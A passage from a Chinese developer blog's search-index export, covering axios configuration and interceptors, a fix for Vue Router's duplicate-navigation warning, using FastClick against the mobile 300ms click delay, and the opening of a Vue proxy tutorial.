class="attr">auth</span>: : &#123;</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&#x27;mikeymike&#x27;</span>,</span><br><span class="line">      <span class="attr">password</span>: <span class="string">&#x27;rapunz3l&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `cancelToken` 指定用于取消请求的 cancel token</span></span><br><span class="line">  <span class="comment">// （查看后面的 Cancellation 这节了解更多）</span></span><br><span class="line">  <span class="attr">cancelToken</span>: <span class="keyword">new</span> CancelToken(<span class="function"><span class="keyword">function</span> (<span class="params">cancel</span>) </span>&#123;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>响应结构</li></ul><p>某个请求的响应包含以下信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// `data` 由服务器提供的响应</span></span><br><span class="line">  <span class="attr">data</span>: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `status` 来自服务器响应的 HTTP 状态码</span></span><br><span class="line">  <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `statusText` 来自服务器响应的 HTTP 状态信息</span></span><br><span class="line">  <span class="attr">statusText</span>: <span class="string">&#x27;OK&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `headers` 服务器响应的头</span></span><br><span class="line">  <span class="attr">headers</span>: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `config` 是为请求提供的配置信息</span></span><br><span class="line">  <span class="attr">config</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>then</code> 时，你将接收下面这样的响应：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">axios.get(<span class="string">&#x27;/user/12345&#x27;</span>)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response.data);</span><br><span class="line">    <span class="built_in">console</span>.log(response.status);</span><br><span class="line">    <span class="built_in">console</span>.log(response.statusText);</span><br><span class="line">    <span class="built_in">console</span>.log(response.headers);</span><br><span class="line">    <span class="built_in">console</span>.log(response.config);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h1 id="全局的-axios-默认值"><a href="#全局的-axios-默认值" class="headerlink" title="全局的 axios 默认值"></a>全局的 axios 默认值</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.baseURL = <span class="string">&#x27;https://api.example.com&#x27;</span>;</span><br><span class="line">axios.defaults.headers.common[<span class="string">&#x27;Authorization&#x27;</span>] = AUTH_TOKEN;</span><br><span class="line">axios.defaults.headers.post[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>;</span><br></pre></td></tr></table></figure><p>自定义实例默认值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建实例时设置配置的默认值</span></span><br><span class="line"><span class="keyword">var</span> instance = axios.create(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;https://api.example.com&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在实例已创建后修改默认值</span></span><br><span class="line">instance.defaults.headers.common[<span class="string">&#x27;Authorization&#x27;</span>] = AUTH_TOKEN;</span><br></pre></td></tr></table></figure><ul><li>配置的优先顺序</li></ul><p>配置会以一个优先顺序进行合并。这个顺序是：在 <code>lib/defaults.js</code> 找到的库的默认值，然后是实例的 <code>defaults</code> 属性，最后是请求的 <code>config</code> 参数。后者将优先于前者。这里是一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用由库提供的配置的默认值来创建实例</span></span><br><span class="line"><span class="comment">// 此时超时配置的默认值是 `0`</span></span><br><span class="line"><span class="keyword">var</span> instance = axios.create();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆写库的超时默认值</span></span><br><span class="line"><span class="comment">// 现在，在超时前，所有请求都会等待 2.5 秒</span></span><br><span class="line">instance.defaults.timeout = <span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为已知需要花费很长时间的请求覆写超时设置</span></span><br><span class="line">instance.get(<span class="string">&#x27;/longRequest&#x27;</span>, &#123;</span><br><span class="line">  timeout: <span class="number">5000</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>在请求或响应被 <code>then</code> 或 <code>catch</code> 处理前拦截它们。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加请求拦截器</span></span><br><span class="line">axios.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在发送请求之前做些什么</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对请求错误做些什么</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加响应拦截器</span></span><br><span class="line">axios.interceptors.response.use(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应数据做点什么</span></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>如果想在稍后移除拦截器，可以这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInterceptor = axios.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="comment">/*...*/</span>&#125;);</span><br><span class="line">axios.interceptors.request.eject(myInterceptor);</span><br></pre></td></tr></table></figure><p>可以为自定义 axios 实例添加拦截器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance = axios.create();</span><br><span class="line">instance.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="comment">/*...*/</span>&#125;);</span><br></pre></td></tr></table></figure><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">axios.get(<span class="string">&#x27;/user/12345&#x27;</span>)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (error.response) &#123;</span><br><span class="line">      <span class="comment">// 请求已发出，但服务器响应的状态码不在 2xx 范围内</span></span><br><span class="line">      <span class="built_in">console</span>.log(error.response.data);</span><br><span class="line">      <span class="built_in">console</span>.log(error.response.status);</span><br><span class="line">      <span class="built_in">console</span>.log(error.response.headers);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Something happened in setting up the request that triggered an Error</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>, error.message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(error.config);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>可以使用 <code>validateStatus</code> 配置选项定义一个自定义 HTTP 状态码的错误范围。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">axios.get(<span class="string">&#x27;/user/12345&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">validateStatus</span>: <span class="function"><span class="keyword">function</span> (<span class="params">status</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> status &lt; <span class="number">500</span>; <span class="comment">// 状态码在大于或等于500时才会 reject</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vue中使用"><a href="#Vue中使用" class="headerlink" title="Vue中使用"></a>Vue中使用</h1><p><code>脚手架中使用</code></p><p>将下面代码加入入口文件:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueAxios <span class="keyword">from</span> <span class="string">&#x27;vue-axios&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueAxios, axios)</span><br></pre></td></tr></table></figure><p>绑定到单个文件组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.axios.get(api).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;  <span class="built_in">console</span>.log(response.data)&#125;)<span class="built_in">this</span>.axios.get(api).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;  <span class="built_in">console</span>.log(response.data)&#125;)<span class="built_in">this</span>.$http.get(api).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;  <span class="built_in">console</span>.log(response.data)&#125;)</span><br></pre></td></tr></table></figure><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对axios进行二次封装</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用对象axios对象的方法create， 去创建一个axios实例</span></span><br><span class="line"><span class="keyword">const</span> requests = axios.create(&#123;</span><br><span class="line">    <span class="comment">// 配置对象</span></span><br><span class="line">    <span class="attr">baseURL</span>:<span class="string">&#x27;/api&#x27;</span>, <span class="comment">// 基础路径， 路径中会出现api</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">50000</span>, <span class="comment">// 代表请求超时的时间5s</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器 在发送请求之前，请求拦截器可以检测到, 可以在请求发出去之前做一些事情</span></span><br><span class="line">requests.interceptors.request.use( <span class="function">(<span class="params">config</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// config 配置对象，对象中有一个属性很重要， headers请求头</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相应拦截器</span></span><br><span class="line">requests.interceptors.response.use( <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 成功回调函数, 服务器相应数据返回来之后响应拦截器</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 失败回调函数, 服务器相应数据返回失败之后响应拦截器</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;faile&#x27;</span>));</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> requests<span class="comment">// 对axios进行二次封装</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用对象axios对象的方法create， 去创建一个axios实例</span></span><br><span class="line"><span class="keyword">const</span> request = axios.create(&#123;</span><br><span class="line">    <span class="comment">// 配置对象</span></span><br><span class="line">    <span class="attr">baseURL</span>:<span class="string">&#x27;/api&#x27;</span>, <span class="comment">// 基础路径， 路径中会出现api</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">50000</span>, <span class="comment">// 代表请求超时的时间5s</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器 在发送请求之前，请求拦截器可以检测到, 可以在请求发出去之前做一些事情</span></span><br><span class="line">request.interceptors.request.use( <span class="function">(<span class="params">config</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// config 配置对象，对象中有一个属性很重要， headers请求头</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相应拦截器</span></span><br><span class="line">request.interceptors.response.request.use( <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 成功回调函数, 服务器相应数据返回来之后响应拦截器</span></span><br><span class="line">    <span class="keyword">return</span> res.data;</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 失败回调函数, 服务器相应数据返回失败之后响应拦截器</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;faile&#x27;</span>));</span><br><span class="line"></span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> request</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Vue编程式路由的警告错误题</title>
      <link href="/2022/03/06/%E8%A7%A3%E5%86%B3Vue%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E7%9A%84%E8%AD%A6%E5%91%8A%E9%94%99%E8%AF%AF/"/>
      <url>/2022/03/06/%E8%A7%A3%E5%86%B3Vue%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E7%9A%84%E8%AD%A6%E5%91%8A%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="解决Vue编程式路由的警告错误题"><a href="#解决Vue编程式路由的警告错误题" class="headerlink" title="解决Vue编程式路由的警告错误题"></a>解决Vue编程式路由的警告错误题</h1><ul><li>当编程式路由多次执行跳转时就会产生：<code>NavigationDuplicated</code>的警告</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203062110998.png"></p><ul><li><p>路由跳转有两种形式: 声明导航、编程时导航</p></li><li><p><code>push</code>、<code>replace</code> </p></li><li><p>声明式导航没有这类问题，因为vue-router底层已经处理好了</p></li></ul><blockquote><p>为什么编程式导航进行路由跳转时会出现这种警告?</p><p>因为’vue-router’: ‘^3.5.3’ : 最新的vue-router引入了promise</p></blockquote><p>虽然对程序没有什么影响,但是控制台会飘红</p><p>由于使用了promise的原因那么我们就得使用成功与失败的回调函数</p><p>promise示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>调用push或者replace方法时给它传入两个回调函数一个是成功回调一个是失败回调</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">goSearch</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$router.replace( &#123;</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;search&#x27;</span>,</span><br><span class="line">              <span class="attr">params</span>:&#123;</span><br><span class="line">                <span class="attr">keyword</span>: <span class="built_in">this</span>.keyword</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="function">(<span class="params">succeed</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;成功回调&#x27;</span>);</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;失败回调&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          )</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>问题解决</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203062111967.png"></p><h1 id="一劳永逸"><a href="#一劳永逸" class="headerlink" title="一劳永逸"></a>一劳永逸</h1><p>重写push和replace方法</p><p>push和replace</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解决Vue-Router升级导致的Uncaught(in promise) navigation guard问题</span></span><br><span class="line"><span class="keyword">const</span> originalPush = VueRouter.prototype.push</span><br><span class="line">VueRouter.prototype.push = <span class="function"><span class="keyword">function</span> <span class="title">push</span> (<span class="params">location, onResolve, onReject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (onResolve || onReject) <span class="keyword">return</span> originalPush.call(<span class="built_in">this</span>, location, onResolve, onReject)</span><br><span class="line">  <span class="keyword">return</span> originalPush.call(<span class="built_in">this</span>, location).catch(<span class="function"><span class="params">err</span> =&gt;</span> err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决Vue-Router升级导致的Uncaught(in promise) navigation guard问题</span></span><br><span class="line"><span class="keyword">const</span> originalReplace = VueRouter.prototype.replace</span><br><span class="line">VueRouter.prototype.replace = <span class="function"><span class="keyword">function</span> <span class="title">replace</span> (<span class="params">location, onResolve, onReject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (onResolve || onReject) <span class="keyword">return</span> originalReplace.call(<span class="built_in">this</span>, location, onResolve, onReject)</span><br><span class="line">  <span class="keyword">return</span> originalPush.call(<span class="built_in">this</span>, location).catch(<span class="function"><span class="params">err</span> =&gt;</span> err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 维护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何解决移动端Click事件300ms延迟的问题</title>
      <link href="/2022/03/06/%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF0.3s%E5%BB%B6%E8%BF%9F/"/>
      <url>/2022/03/06/%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF0.3s%E5%BB%B6%E8%BF%9F/</url>
      
        <content type="html"><![CDATA[<center><h1>   决移动端Click事件300ms延迟    </h1></center><h1 id="为什么移动端点击事件要加300ms延迟呢？"><a href="#为什么移动端点击事件要加300ms延迟呢？" class="headerlink" title="为什么移动端点击事件要加300ms延迟呢？"></a>为什么移动端点击事件要加300ms延迟呢？</h1><p>早在 2007 年初，苹果公司在发布首款 iPhone 前夕，遇到一个问题：当时的网站都是为大屏幕设备所设计的。于是苹果的工程师们做了一些约定，应对 iPhone 这种小屏幕浏览桌面端站点的问题。</p><p>这当中最出名的，当属双击缩放(double tap to zoom)，这也是会有上述 300 毫秒延迟的主要原因。</p><p>从点击屏幕上的元素到触发元素的 <code>click</code> 事件，移动浏览器会有大约 300 毫秒的等待时间。为什么这么设计呢？ 因为它想看看你是不是要进行双击（double tap）操作。</p><h1 id="如何解决300ms延迟问题"><a href="#如何解决300ms延迟问题" class="headerlink" title="如何解决300ms延迟问题"></a>如何解决300ms延迟问题</h1><p>我们就推荐一种最有效、最方便的解决方案，大家应该都用过这个方法，那就是FastClick.js。</p><p>FastClick 是 FT Labs 专门为解决移动端浏览器 300 毫秒点击延迟问题所开发的一个轻量级的库。FastClick的实现原理是在检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后的click事件阻止掉。</p><h1 id="如何使用FastClick"><a href="#如何使用FastClick" class="headerlink" title="如何使用FastClick"></a>如何使用FastClick</h1><p>在HTML页面中添加viewport和引入fastClick库</p><p>viewport</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fastClick</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;application/javascript&#x27;</span> src=<span class="string">&#x27;/path/to/fastclick.js&#x27;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>必须在页面所有Element之前加载脚本文件先实例化fastclick</p></blockquote><p>在JS中添加fastclick的身体，推荐以下做法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;addEventListener&#x27;</span> <span class="keyword">in</span> <span class="built_in">document</span>) &#123;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">FastClick.attach(<span class="built_in">document</span>.body);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你使用了JQuery，那么JS引入就可以改用下面的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">FastClick.attach(<span class="built_in">document</span>.body);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 维护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue配置代理</title>
      <link href="/2022/02/27/Vue%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
      <url>/2022/02/27/Vue%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue配置代理</h1></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>用于异步请求获取数据用于局部刷新， 解决同源策略问题</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>使用axios发起异步请求的时候如果资源不在同一个域中会引起同源策略问题</p><p>例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getStundetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    axios.get(<span class="string">&#x27;http://localhost:5000/students&#x27;</span>).then(</span><br><span class="line">        <span class="function"><span class="params">response</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求成功&#x27;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="params">error</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等到发送请求的时候浏览器会报同源策略问题</p><p><img src="C:\Users\gwl\AppData\Roaming\Typora\typora-user-images\image-20220227165838818.png" alt="image-20220227165838818"></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="开启代理方式一"><a href="#开启代理方式一" class="headerlink" title="开启代理方式一"></a>开启代理方式一</h3><p>需要一台代理服务器用于接收数据</p><ol><li><p>在vue-cli中开启一个服务器, 在vue.config中配置, 配置完后需要重新启动vue脚手架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">  